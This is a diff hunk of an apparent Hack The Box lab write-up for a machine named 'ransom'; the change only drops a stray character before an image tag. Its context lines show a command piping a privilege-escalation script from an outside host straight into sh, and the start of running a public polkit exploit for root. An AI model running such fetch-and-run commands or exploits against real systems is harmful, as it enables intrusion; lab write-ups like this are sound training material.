@@ -214,7 +214,7 @@ uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),4
 htb
 </code></pre><p>Based on that, we just need root&rsquo;s password and we are good to go.</p>
 <p>After running Linpeas with <code>curl -L http://10.10.17.8:5555/linpeas.sh | sh</code>, I found the following:</p>
-<p>!<img alt="Image Description" src="/images/Pasted%20image%2020260116155512.png"></p>
+<p><img alt="Image Description" src="/images/Pasted%20image%2020260116155512.png"></p>
 <p>Looking up the CVE, I&rsquo;m now reading <a href="https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/">this article</a> which details how to exploit it. We&rsquo;ll give this a quick go, then look at all the password files after.</p>
 <p>Testing the repo at <a href="https://github.com/tufanturhan/Polkit-Linux-Priv">https://github.com/tufanturhan/Polkit-Linux-Priv</a>:</p>
 <pre tabindex="0"><code>htb@ransom:~$ python3 cve.py
